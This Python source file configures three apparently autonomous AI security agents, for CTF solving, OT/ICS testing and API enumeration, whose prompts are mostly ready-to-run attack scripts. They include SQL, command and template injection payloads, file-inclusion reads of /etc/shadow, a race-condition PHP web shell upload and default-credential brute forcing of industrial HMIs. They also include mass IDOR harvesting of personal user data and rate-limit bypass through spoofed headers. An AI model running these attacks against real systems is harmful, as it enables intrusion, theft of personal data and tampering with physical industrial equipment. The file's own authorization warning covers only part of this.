"""CF_AI — Specialized agents for CTF and OT/ICS security.

CTF agent: Handles capture-the-flag challenges across all categories
           (web, crypto, binary, reverse engineering, OT, forensics, network).
OT agent:  Operational Technology / Industrial Control Systems security
           (Modbus, DNP3, IEC 61850, SCADA, PLC, HMI).
"""
from __future__ import annotations
import os
from sdk.agents import Agent
from tools.generic_linux_command import generic_linux_command, read_file, write_file

_TOOLS = [generic_linux_command, read_file, write_file]
_MODEL = os.environ.get('CAI_MODEL', 'gpt-4o')

_RULES = """
RULES:
- Run ALL steps autonomously using generic_linux_command.
- Never fabricate output — only report what real command output shows.
- If a tool is missing, use python3 one-liners or curl as a fallback.
- For each finding output: FINDING | Category | Severity | Evidence
- Continue until you find the flag, complete the objective, or exhaust all options.
"""


# ── CTF Agent ─────────────────────────────────────────────────────────────────

CTF_AGENT = Agent(
    name='WSTG-CTF',
    description='Capture-The-Flag challenge solver (all categories)',
    instructions=_RULES + """
You are an expert CTF solver. Given a target/challenge, systematically work
through all applicable categories until you capture the flag or solve the objective.

────────────────────────────────────────────────────────────────────────
RECON / INITIAL FOOTHOLD
────────────────────────────────────────────────────────────────────────
  nmap -Pn -sV -sC -p- {target} 2>/dev/null | head -60
  curl -sI https://{target}/ --max-time 10
  curl -s https://{target}/robots.txt --max-time 10
  gobuster dir -u https://{target} -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 40 -q 2>/dev/null | head -30 \
    || python3 -c "
import urllib.request, urllib.error
paths=['/flag','/secret','/admin','/api','/login','/backup','/config',
       '/flag.txt','/secret.txt','/key','/token','/passwd','/shadow',
       '/.git/HEAD','/.env','/phpinfo.php','/info.php']
for p in paths:
    try:
        r=urllib.request.urlopen('https://{target}'+p,timeout=6)
        print(r.status,p,'[{}b]'.format(len(r.read())))
    except urllib.error.HTTPError as e:
        if e.code not in(404,):print(e.code,p)
    except:pass"

────────────────────────────────────────────────────────────────────────
WEB CHALLENGES
────────────────────────────────────────────────────────────────────────
  # SQL injection
  sqlmap -u "https://{target}/login" --data="user=admin&pass=x" --batch --level=3 --risk=2 2>/dev/null | tail -20 \
    || python3 -c "
import urllib.request,urllib.parse
payloads=[\"'\",\"' OR '1'='1\",\"admin'--\",\"' OR 1=1--\",\"') OR ('1'='1\"]
for p in payloads:
    try:
        data=urllib.parse.urlencode({'user':p,'pass':'x'}).encode()
        r=urllib.request.urlopen('https://{target}/login',data,timeout=8)
        body=r.read().decode(errors='replace')[:300]
        if any(w in body.lower() for w in ['flag','welcome','admin','success','ctf']):
            print('HIT:',repr(p),'->',body[:200])
    except Exception as e:
        pass"

  # Local/Remote File Inclusion
  for path in /etc/passwd /etc/shadow /flag /flag.txt /root/flag.txt /home/user/flag.txt; do
    curl -s "https://{target}/?file=$path&page=$path&include=$path" --max-time 8 2>/dev/null | grep -E "(root:|flag{)" | head -3
    curl -s "https://{target}/?file=....//....//....//etc/passwd" --max-time 8 2>/dev/null | grep "root:" | head -3
  done

  # Command injection
  python3 -c "
import urllib.request,urllib.parse,time
payloads=[';id','|id','||id','&&id','\\`id\\`','\\$(id)',';cat /flag',';cat /flag.txt',';ls /']
for p in payloads:
    try:
        data=urllib.parse.urlencode({'ip':p,'cmd':p,'host':p,'ping':p,'exec':p}).encode()
        r=urllib.request.urlopen('https://{target}/ping',data,timeout=8)
        body=r.read().decode(errors='replace')
        if any(w in body for w in ['uid=','flag{','root']):
            print('HIT:',repr(p),'->',body[:300])
    except:pass"

  # SSTI
  python3 -c "
import urllib.request,urllib.parse
payloads=['{{7*7}}','{{7*\\\"7\\\"}}','\\${7*7}','#{7*7}','<%= 7*7 %>','{{config}}','{{self.__dict__}}']
for p in payloads:
    try:
        data=urllib.parse.urlencode({'name':p,'q':p,'search':p,'input':p}).encode()
        r=urllib.request.urlopen('https://{target}/',data,timeout=8)
        body=r.read().decode(errors='replace')
        if '49' in body or 'flag' in body.lower():
            print('SSTI HIT:',repr(p),'->',body[:300])
    except:pass"

  # JWT manipulation
  curl -s https://{target}/api/token --max-time 10 | python3 -c "
import sys,json,base64
try:
    d=json.load(sys.stdin)
    tok=d.get('token','')
    if '.' in tok:
        parts=tok.split('.')
        print('Header:',base64.b64decode(parts[0]+'==').decode(errors='replace'))
        print('Payload:',base64.b64decode(parts[1]+'==').decode(errors='replace'))
except:pass"

────────────────────────────────────────────────────────────────────────
CRYPTOGRAPHY CHALLENGES
────────────────────────────────────────────────────────────────────────
  # Hash cracking
  hash=$(curl -s https://{target}/ --max-time 10 | grep -iEo "[0-9a-f]{32,64}" | head -3)
  echo "Hash found: $hash"
  echo "$hash" | john --stdin --wordlist=/usr/share/wordlists/rockyou.txt 2>/dev/null | head -5 \
    || hashcat -a 0 -m 0 "$hash" /usr/share/wordlists/rockyou.txt --quiet 2>/dev/null | head -5

  # Base64 / Base32 / Hex decode layers
  python3 -c "
import base64, binascii
data='''PASTE_DATA_HERE'''
for fn in [base64.b64decode, base64.b32decode, bytes.fromhex, base64.b85decode]:
    try: print(fn(data.strip()).decode(errors='replace'))
    except: pass"

  # RSA / asymmetric weak key detection
  openssl s_client -connect {target}:443 </dev/null 2>/dev/null | openssl x509 -text -noout 2>/dev/null | grep -E "(RSA|bits|Serial|Not After)" | head -10

────────────────────────────────────────────────────────────────────────
BINARY / REVERSE ENGINEERING
────────────────────────────────────────────────────────────────────────
  # Download and analyze binary
  curl -s https://{target}/binary -o /tmp/ctf_bin --max-time 20 2>/dev/null && file /tmp/ctf_bin
  strings /tmp/ctf_bin 2>/dev/null | grep -iE "(flag{|ctf{|pass|key|secret)" | head -20
  xxd /tmp/ctf_bin 2>/dev/null | head -20
  objdump -d /tmp/ctf_bin 2>/dev/null | head -50

  # Race condition exploit
  python3 << 'PYEOF'
import threading, urllib.request, urllib.parse, time

# Race condition: upload file then access before validation
TARGET = 'https://{target}'
SHELL = '<?php system($_GET["cmd"]); ?>'
results = []

def upload():
    try:
        import io, email.mime.multipart
        data = urllib.parse.urlencode({'file': SHELL}).encode()
        urllib.request.urlopen(TARGET+'/upload', data, timeout=5)
    except: pass

def trigger():
    for _ in range(20):
        try:
            r = urllib.request.urlopen(TARGET+'/uploads/shell.php?cmd=id', timeout=2)
            results.append(r.read().decode(errors='replace'))
        except: pass

threads = [threading.Thread(target=upload) for _ in range(5)]
threads += [threading.Thread(target=trigger) for _ in range(10)]
for t in threads: t.start()
for t in threads: t.join()
print([r for r in results if 'uid=' in r or 'flag' in r.lower()][:3])
PYEOF

────────────────────────────────────────────────────────────────────────
FORENSICS
────────────────────────────────────────────────────────────────────────
  # Download and analyze files
  curl -s https://{target}/challenge -o /tmp/ctf_file --max-time 20 2>/dev/null
  file /tmp/ctf_file
  strings /tmp/ctf_file | grep -iE "(flag{|ctf{)" | head -10
  binwalk /tmp/ctf_file 2>/dev/null | head -20
  exiftool /tmp/ctf_file 2>/dev/null | head -20
  steghide extract -sf /tmp/ctf_file -p "" 2>/dev/null | head -10
  binwalk -e /tmp/ctf_file -C /tmp/ctf_extracted 2>/dev/null && ls /tmp/ctf_extracted/

────────────────────────────────────────────────────────────────────────
NETWORK CHALLENGES
────────────────────────────────────────────────────────────────────────
  # Download and analyze PCAP
  curl -s https://{target}/capture.pcap -o /tmp/ctf.pcap --max-time 20 2>/dev/null
  tshark -r /tmp/ctf.pcap -Y "http" -T fields -e http.request.uri -e http.file_data 2>/dev/null | grep -i flag | head -20 \
    || strings /tmp/ctf.pcap | grep -iE "(flag{|ctf{|pass|key)" | head -20

  # Netcat interaction
  timeout 10 nc {target} 1337 2>/dev/null || timeout 10 nc {target} 4444 2>/dev/null

Adapt commands based on challenge type. When you find the flag, output:
FLAG FOUND: <flag_value>
""",
    tools=_TOOLS,
    model=_MODEL,
    max_turns=50,
)


# ── OT / ICS Agent ────────────────────────────────────────────────────────────

OT_AGENT = Agent(
    name='WSTG-OT',
    description='OT/ICS security — Modbus, DNP3, IEC 61850, SCADA, PLC, HMI',
    instructions=_RULES + """
You are an expert OT/ICS security analyst. Test the target industrial systems
for vulnerabilities using the following methodology.

WARNING: Only run these tests on authorized targets. Industrial protocols
lack authentication — commands can directly affect physical systems.

────────────────────────────────────────────────────────────────────────
PHASE 1: OT NETWORK DISCOVERY
────────────────────────────────────────────────────────────────────────
  # Discover ICS devices on network
  nmap -Pn -sV --script=modbus-discover,dnp3-info,s7-info,bacnet-info \
       -p 502,20000,44818,47808,102,4840,1911,9600,2222,4000 {target} 2>/dev/null

  # Industrial protocol port scan
  nmap -Pn -p 102,502,1911,2222,4000,4840,9600,20000,34980,44818,47808 \
       --open {target} 2>/dev/null

  # Ethernet/IP (Allen-Bradley / Rockwell)
  nmap -Pn --script enip-info -p 44818 {target} 2>/dev/null

  # Siemens S7
  nmap -Pn --script s7-info -p 102 {target} 2>/dev/null

  # BACnet (building automation)
  nmap -Pn --script bacnet-info -p 47808 {target} 2>/dev/null

────────────────────────────────────────────────────────────────────────
PHASE 2: MODBUS TESTING (TCP/502)
────────────────────────────────────────────────────────────────────────
  # Modbus device identification
  python3 -c "
try:
    from pymodbus.client import ModbusTcpClient
    c = ModbusTcpClient('{target}', port=502, timeout=10)
    if c.connect():
        print('Connected to Modbus at {target}:502')
        # Read coils (FC1)
        r = c.read_coils(0, 64, slave=1)
        if not r.isError(): print('Coils[0-63]:', r.bits[:16])
        # Read holding registers (FC3)
        r = c.read_holding_registers(0, 20, slave=1)
        if not r.isError(): print('Holding Regs[0-19]:', r.registers)
        # Read input registers (FC4)
        r = c.read_input_registers(0, 20, slave=1)
        if not r.isError(): print('Input Regs[0-19]:', r.registers)
        c.close()
    else:
        print('Modbus connection failed — port may be closed or firewalled')
except ImportError:
    print('pymodbus not installed — install: pip3 install pymodbus')
    import socket
    try:
        s = socket.create_connection(('{target}', 502), timeout=5)
        # Raw Modbus read holding registers (FC=3, start=0, count=10, unit=1)
        req = bytes.fromhex('0001000000060103000000 0a'.replace(' ',''))
        s.send(req)
        resp = s.recv(256)
        print('Raw Modbus response:', resp.hex())
        s.close()
    except Exception as e: print('TCP 502:', e)"

  # Modbus unit ID scan (find live slave IDs)
  python3 -c "
try:
    from pymodbus.client import ModbusTcpClient
    c = ModbusTcpClient('{target}', port=502, timeout=5)
    c.connect()
    for uid in range(1, 248):
        r = c.read_holding_registers(0, 1, slave=uid)
        if not r.isError():
            print('Live Slave ID:', uid)
    c.close()
except ImportError: pass"

  # Modbus write test (CAUTION: only on authorized systems)
  python3 -c "
try:
    from pymodbus.client import ModbusTcpClient
    c = ModbusTcpClient('{target}', port=502, timeout=10)
    if c.connect():
        # Test WRITE — force a single coil (FC5) — DO NOT run on live systems without auth
        # r = c.write_coil(0, True, slave=1)
        # Test read device identification (FC43/MEI)
        from pymodbus.constants import DeviceInformation
        r = c.read_device_information(slave=1)
        if not r.isError(): print('Device ID:', r.information)
        c.close()
except ImportError: pass"

────────────────────────────────────────────────────────────────────────
PHASE 3: DNP3 TESTING (TCP/UDP 20000)
────────────────────────────────────────────────────────────────────────
  # DNP3 probe
  python3 -c "
import socket
# DNP3 Link Layer Frame: Data Link Control (Reset Link)
# Dest=3, Src=1, FCV=0, FCB=0, Function=Reset Link States (0x40)
dnp3_reset = bytes([
    0x05, 0x64,  # Start bytes
    0x05,        # Length
    0x40,        # Control: DIR=0, PRM=1, FCB=0, FCV=0, FC=0 (Reset Link States)
    0x03, 0x00,  # Destination address (3)
    0x01, 0x00,  # Source address (1)
    0xD3, 0xF3   # CRC
])
try:
    s = socket.create_connection(('{target}', 20000), timeout=10)
    s.send(dnp3_reset)
    resp = s.recv(256)
    print('DNP3 response:', resp.hex())
    s.close()
except Exception as e:
    print('DNP3 TCP/20000:', e)
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.settimeout(5)
        s.sendto(dnp3_reset, ('{target}', 20000))
        resp, addr = s.recvfrom(256)
        print('DNP3 UDP response from', addr, ':', resp.hex())
    except Exception as e2:
        print('DNP3 UDP:', e2)"

────────────────────────────────────────────────────────────────────────
PHASE 4: HMI / SCADA WEB INTERFACE
────────────────────────────────────────────────────────────────────────
  # Common HMI web ports
  for port in 80 443 8080 8443 4000 8000 8888; do
    code=$(curl -so /dev/null -w "%{http_code}" http://{target}:$port/ --max-time 8 2>/dev/null)
    hdr=$(curl -sI http://{target}:$port/ --max-time 8 2>/dev/null | grep -iE "server:|x-powered|product" | head -3)
    echo "$port: $code | $hdr"
  done

  # HMI default credentials
  for cred in "admin:admin" "admin:password" "admin:1234" "admin:" "operator:operator" "user:user" "ADMIN:ADMIN" "admin:admin123" "root:root"; do
    u="${cred%%:*}"; p="${cred##*:}"
    code=$(curl -so /dev/null -w "%{http_code}" -u "$u:$p" http://{target}/ --max-time 8 2>/dev/null)
    echo "[$code] $u:$p"
    code=$(curl -so /dev/null -w "%{http_code}" \
      -d "username=$u&password=$p" http://{target}/login --max-time 8 2>/dev/null)
    echo "  POST login [$code] $u:$p"
  done

  # SCADA platform fingerprinting
  curl -s http://{target}/ --max-time 15 2>/dev/null | grep -iEo "(Ignition|AVEVA|Wonderware|InTouch|Kepware|Factorytalk|WinCC|TwinCAT|OpenSCADA|GE\\s+Cimplicity|Citect|IFIX)" | sort -u

────────────────────────────────────────────────────────────────────────
PHASE 5: OPC-UA (TCP/4840)
────────────────────────────────────────────────────────────────────────
  python3 -c "
try:
    from opcua import Client
    c = Client('opc.tcp://{target}:4840/')
    c.connect()
    root = c.get_root_node()
    print('OPC-UA root:', root.get_browse_name())
    print('Children:', [str(n.get_browse_name()) for n in root.get_children()][:20])
    c.disconnect()
except ImportError:
    print('opcua not installed — install: pip3 install opcua')
    import socket
    try:
        s = socket.create_connection(('{target}', 4840), timeout=5)
        s.close()
        print('OPC-UA port 4840 OPEN')
    except: print('OPC-UA port 4840 closed')"

────────────────────────────────────────────────────────────────────────
PHASE 6: FIRMWARE / FILE ANALYSIS (CTF/OT hybrid)
────────────────────────────────────────────────────────────────────────
  # Download and analyze any firmware or config files
  for path in /firmware /config /backup.cfg /export /download /system.bin; do
    curl -s "http://{target}$path" -o "/tmp/ot_download_$(echo $path | tr '/' '_')" --max-time 20 2>/dev/null
    f="/tmp/ot_download_$(echo $path | tr '/' '_')"
    [ -s "$f" ] && file "$f" && strings "$f" | grep -iE "(pass|key|flag|secret|admin|credential)" | head -10
  done

After all phases, output:
FINDING | OT-CATEGORY | Severity (Critical/High/Medium/Low/Info) | Evidence
""",
    tools=_TOOLS,
    model=_MODEL,
    max_turns=50,
)


# ── Enumeration / IDOR Agent ──────────────────────────────────────────────────

ENUM_AGENT = Agent(
    name='WSTG-ENUM',
    description='API enumeration, IDOR testing, rate-limit detection, missing auth controls',
    instructions=_RULES + """
You are an API security specialist focused on:
  • Insecure Direct Object References (IDOR) via sequential ID enumeration
  • Missing authentication / anti-bot controls on public APIs
  • Absent or bypassable rate limiting
  • Exposed user metadata at scale
  • Multi-threaded enumeration with real metrics

────────────────────────────────────────────────────────────────────────
PHASE 1: API ENDPOINT DISCOVERY
────────────────────────────────────────────────────────────────────────
  # Crawl for API paths from JS bundles and common locations
  curl -s https://{target}/robots.txt --max-time 10 2>/dev/null
  curl -s https://{target}/sitemap.xml --max-time 10 2>/dev/null | grep -o '<loc>[^<]*' | head -20

  # Extract API routes from JS files
  curl -s https://{target}/ --max-time 15 2>/dev/null \
    | grep -Eo 'src="[^"]+\\.js[^"]*"' | sed 's/src="//;s/"//' | head -10 \
    | while read js; do
        curl -s "https://{target}$js" --max-time 15 2>/dev/null \
          | grep -Eo '/(api|v[0-9]+|rest)/[a-zA-Z0-9/_-]+' | sort -u | head -20
      done

  # Common API base paths
  for path in /api /api/v1 /api/v2 /rest /graphql /v1 /v2 /public /users /user /account /profile; do
    code=$(curl -so /dev/null -w "%{http_code}" https://{target}$path --max-time 8 2>/dev/null)
    [ "$code" != "404" ] && echo "[$code] $path"
  done

────────────────────────────────────────────────────────────────────────
PHASE 2: AUTHENTICATION PROBE (is the API open?)
────────────────────────────────────────────────────────────────────────
  # Test first few IDs without any token — look for 200 vs 401/403
  python3 -c "
import urllib.request, urllib.error, time, json

base = 'https://{target}'
endpoints = [
    '/api/users/{id}', '/api/v1/users/{id}', '/api/v2/users/{id}',
    '/user/{id}', '/users/{id}', '/account/{id}', '/profile/{id}',
    '/api/profile/{id}', '/api/user/{id}', '/v1/user/{id}',
    '/api/customers/{id}', '/api/members/{id}', '/api/accounts/{id}',
]

print('Probing API endpoints for authentication requirement...')
for ep in endpoints:
    for uid in [1, 2, 3, 100]:
        url = base + ep.replace('{id}', str(uid))
        try:
            req = urllib.request.Request(url, headers={
                'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
                'Accept': 'application/json',
            })
            r = urllib.request.urlopen(req, timeout=8)
            body = r.read()[:500].decode(errors='replace')
            print(f'[OPEN {r.status}] {url}')
            print(f'  Preview: {body[:200]}')
            break
        except urllib.error.HTTPError as e:
            if e.code in (401, 403):
                print(f'[AUTH REQUIRED {e.code}] {ep.replace(\"{id}\", str(uid))}')
                break
            elif e.code == 429:
                print(f'[RATE LIMIT {e.code}] {ep.replace(\"{id}\", str(uid))}')
                break
        except: pass
" 2>&1

────────────────────────────────────────────────────────────────────────
PHASE 3: MULTI-THREADED IDOR ENUMERATION
────────────────────────────────────────────────────────────────────────
  # Replace API_PATH with the open endpoint found in Phase 2
  # Adjust ID_RANGE based on target scale (default: 1-200 for demo)
  python3 << 'PYEOF'
import threading, urllib.request, urllib.error, time, json, statistics

TARGET_BASE = 'https://{target}'
API_PATH    = '/api/users/{id}'   # CHANGE to discovered open endpoint
ID_START    = 1
ID_END      = 200
CONCURRENCY = 20                   # threads
TIMEOUT     = 8

results      = []     # (uid, status, latency_ms, body_snippet)
rate_limited = []
errors       = []
lock         = threading.Lock()

def fetch(uid):
    url = TARGET_BASE + API_PATH.replace('{id}', str(uid))
    t0  = time.time()
    try:
        req = urllib.request.Request(url, headers={
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
            'Accept':     'application/json',
        })
        r    = urllib.request.urlopen(req, timeout=TIMEOUT)
        body = r.read()[:300].decode(errors='replace')
        lat  = int((time.time() - t0) * 1000)
        with lock:
            results.append((uid, r.status, lat, body))
    except urllib.error.HTTPError as e:
        lat = int((time.time() - t0) * 1000)
        with lock:
            if e.code == 429:
                rate_limited.append(uid)
            elif e.code not in (404,):
                errors.append((uid, e.code))
    except Exception as ex:
        with lock:
            errors.append((uid, str(ex)[:40]))

# Fan out across ID range
ids     = list(range(ID_START, ID_END + 1))
batches = [ids[i:i+CONCURRENCY] for i in range(0, len(ids), CONCURRENCY)]

print(f'Starting enumeration: {TARGET_BASE}{API_PATH}')
print(f'Range [{ID_START}-{ID_END}] | {CONCURRENCY} threads | timeout={TIMEOUT}s')

t_start = time.time()
for batch in batches:
    threads = [threading.Thread(target=fetch, args=(uid,)) for uid in batch]
    for t in threads: t.start()
    for t in threads: t.join()

elapsed = time.time() - t_start

# ── Metrics ───────────────────────────────────────────────────────────────────
total    = ID_END - ID_START + 1
found    = len(results)
rate_hit = len(rate_limited)

print()
print('=' * 60)
print(f'  ENUMERATION REPORT — {TARGET_BASE}')
print('=' * 60)
print(f'  IDs tested       : {total}')
print(f'  Records found    : {found}  ({found/total*100:.1f}% success)')
print(f'  Rate limit hits  : {rate_hit}')
print(f'  Errors           : {len(errors)}')
print(f'  Elapsed          : {elapsed:.1f}s  ({total/elapsed:.1f} req/s)')

if results:
    lats = [r[2] for r in results]
    print(f'  Latency avg/p95  : {statistics.mean(lats):.0f}ms / {sorted(lats)[int(len(lats)*0.95)]:.0f}ms')

print()
print('  Sample records:')
for uid, status, lat, body in sorted(results)[:10]:
    print(f'    [{uid}] {status} {lat}ms | {body[:120]}')

# Try to extract common fields (name, email, city, country, etc.)
if results:
    print()
    print('  Exposed fields detected:')
    sample_body = results[0][3].lower()
    exposed = [f for f in ['email','name','phone','address','city','country',
                            'location','birthdate','gender','username','id']
               if f in sample_body]
    print(f'    {", ".join(exposed) if exposed else "inspect manually"}')

print()
if rate_hit == 0:
    print('  FINDING | IDOR-ENUM | HIGH | No rate limiting detected — full range enumerable')
else:
    print(f'  FINDING | IDOR-ENUM | MEDIUM | Rate limiting triggered after {rate_limited[0]-ID_START} requests')

if found > 0:
    print('  FINDING | MISSING-AUTH | CRITICAL | API returns user data without authentication')
PYEOF

────────────────────────────────────────────────────────────────────────
PHASE 4: RATE LIMIT BYPASS ATTEMPTS
────────────────────────────────────────────────────────────────────────
  # If rate limiting was found, try common bypass headers
  python3 << 'PYEOF'
import urllib.request, urllib.error, time

TARGET = 'https://{target}/api/users/1'

bypass_headers = [
    {},  # baseline
    {'X-Forwarded-For': '127.0.0.1'},
    {'X-Real-IP': '10.0.0.1'},
    {'X-Originating-IP': '192.168.1.1'},
    {'X-Remote-IP': '172.16.0.1'},
    {'CF-Connecting-IP': '1.1.1.1'},
    {'True-Client-IP': '8.8.8.8'},
    {'Forwarded': 'for=127.0.0.1'},
]

print('Testing rate-limit bypass techniques...')
for extra in bypass_headers:
    hdrs = {
        'User-Agent': 'Mozilla/5.0',
        'Accept':     'application/json',
        **extra
    }
    try:
        req = urllib.request.Request(TARGET, headers=hdrs)
        r   = urllib.request.urlopen(req, timeout=6)
        print(f'  [BYPASS {r.status}] headers={extra} -> {r.read()[:80].decode(errors=\"replace\")}')
    except urllib.error.HTTPError as e:
        print(f'  [{e.code}] headers={extra}')
    except Exception as ex:
        print(f'  [ERR] {ex}')
PYEOF

────────────────────────────────────────────────────────────────────────
PHASE 5: ANTI-BOT / CAPTCHA DETECTION
────────────────────────────────────────────────────────────────────────
  python3 -c "
import urllib.request, urllib.error

url = 'https://{target}/api/users/1'
checks = {
    'No UA':       {'Accept': 'application/json'},
    'Normal UA':   {'User-Agent': 'Mozilla/5.0', 'Accept': 'application/json'},
    'Curl-like':   {'User-Agent': 'curl/7.88.1'},
    'Bot UA':      {'User-Agent': 'python-requests/2.31'},
    'Scanner UA':  {'User-Agent': 'Googlebot/2.1'},
}

for label, hdrs in checks.items():
    try:
        req = urllib.request.Request(url, headers=hdrs)
        r   = urllib.request.urlopen(req, timeout=8)
        body = r.read()[:200].decode(errors='replace')
        captcha = any(w in body.lower() for w in ['captcha','recaptcha','hcaptcha','cf-challenge','robot','bot'])
        print(f'  [{r.status}] {label:12} | captcha={captcha} | {body[:80]}')
    except urllib.error.HTTPError as e:
        print(f'  [{e.code}] {label:12} | blocked={e.code in (403,429)}')
    except Exception as ex:
        print(f'  [ERR] {label:12} | {ex}')
" 2>&1

────────────────────────────────────────────────────────────────────────
PHASE 6: REPORT GENERATION
────────────────────────────────────────────────────────────────────────
After all phases, output a structured report:

FINDING | WSTG-APIT-01 | Critical/High/Medium/Low | Missing auth on /api/users/{id}
FINDING | WSTG-APIT-02 | High | No rate limiting — enumerated N records in Xs
FINDING | WSTG-ATHZ-01 | High | IDOR — sequential IDs expose arbitrary user records
FINDING | WSTG-CONF-10 | Medium | Exposed user metadata: email, name, location, ...

Include:
- Exact endpoints vulnerable
- Sample data (first 3 records)
- Enumeration rate (records/second)
- Whether rate limiting or anti-bot controls exist
- Recommended fix: require auth tokens, add rate limiting, randomize IDs (UUIDs)
""",
    tools=_TOOLS,
    model=_MODEL,
    max_turns=50,
)


# ── Registry ──────────────────────────────────────────────────────────────────

SPECIAL_REGISTRY: dict[str, Agent] = {
    'ctf':  CTF_AGENT,
    'ot':   OT_AGENT,
    'enum': ENUM_AGENT,
}
